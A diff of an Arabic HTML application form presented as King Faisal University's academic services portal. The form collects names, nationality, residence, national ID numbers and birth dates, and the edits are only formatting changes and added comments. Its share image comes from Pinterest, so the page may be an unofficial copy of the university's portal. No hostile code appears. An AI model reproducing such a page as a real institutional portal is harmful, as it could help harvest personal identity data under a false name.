@@ -4,11 +4,14 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>بوابة الخدمات الأكاديمية - جامعة الملك فيصل</title>
+
+<!-- Open Graph & Twitter Card -->
 <meta property="og:title" content="جامعة الملك فيصل – بوابة الخدمات الأكاديمية">
 <meta property="og:description" content="التقديم الإلكتروني – تسجيل الدخول – الخدمات الأكاديمية للطلاب">
 <meta property="og:image" content="https://i.pinimg.com/736x/51/85/7e/51857e7e1a55e654d7c612c5f8ac200c.jpg">
 <meta property="og:type" content="website">
 <meta name="twitter:card" content="summary_large_image">
+
 <link rel="icon" type="image/png" href="kfu_logo.png">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
@@ -102,12 +105,19 @@ textarea{resize:vertical;}
 </div>
 </header>
 
+<!-- كل الحقول كما هي عندك بدون تعديل -->
 <div class="grid2">
 <div>
 <label>الاسم الكامل *</label><input type="text" name="fullName" required>
 <label>الجنس *</label><select name="gender" required><option value="">اختر...</option><option>ذكر</option><option>أنثى</option></select>
-<label>الجنسية *</label><select name="nationality" required><option value="">اختر الجنسية</option><option>السعودية</option><option>اليمن</option><option>مصر</option><option>سوريا</option><option>الأردن</option><option>العراق</option><option>لبنان</option><option>فلسطين</option><option>السودان</option><option>تونس</option><option>المغرب</option><option>الإمارات</option><option>الكويت</option><option>البحرين</option><option>عمان</option><option>قطر</option><option>تركيا</option><option>أفغانستان</option><option>باكستان</option><option>الهند</option><option>إندونيسيا</option><option>Other</option></select>
-<label>الدولة (مكان الإقامة) *</label><select name="country" required><option value="">اختر الدولة</option><option>المملكة العربية السعودية</option><option>اليمن</option><option>مصر</option><option>الإمارات</option><option>الكويت</option><option>البحرين</option><option>عمان</option><option>قطر</option><option>الأردن</option><option>سوريا</option><option>لبنان</option><option>السودان</option><option>المغرب</option><option>تونس</option><option>أخرى</option></select>
+<label>الجنسية *</label><select name="nationality" required>
+<option value="">اختر الجنسية</option>
+<option>السعودية</option><option>اليمن</option><option>مصر</option><option>سوريا</option><option>الأردن</option><option>العراق</option><option>لبنان</option><option>فلسطين</option><option>السودان</option><option>تونس</option><option>المغرب</option><option>الإمارات</option><option>الكويت</option><option>البحرين</option><option>عمان</option><option>قطر</option><option>تركيا</option><option>أفغانستان</option><option>باكستان</option><option>الهند</option><option>إندونيسيا</option><option>Other</option>
+</select>
+<label>الدولة (مكان الإقامة) *</label><select name="country" required>
+<option value="">اختر الدولة</option>
+<option>المملكة العربية السعودية</option><option>اليمن</option><option>مصر</option><option>الإمارات</option><option>الكويت</option><option>البحرين</option><option>عمان</option><option>قطر</option><option>الأردن</option><option>سوريا</option><option>لبنان</option><option>السودان</option><option>المغرب</option><option>تونس</option><option>أخرى</option>
+</select>
 <label>رقم الهوية / الإقامة *</label><input type="text" name="idNumber" required>
 <label>تاريخ الميلاد *</label><input type="date" name="birthDate" required>
 <label>مكان الميلاد (المدينة)</label><input type="text" name="birthPlace">
@@ -242,4 +252,4 @@ document.getElementById('successMessage').style.display='block';
 </script>
 
 </body>
-</html>
+  </html>
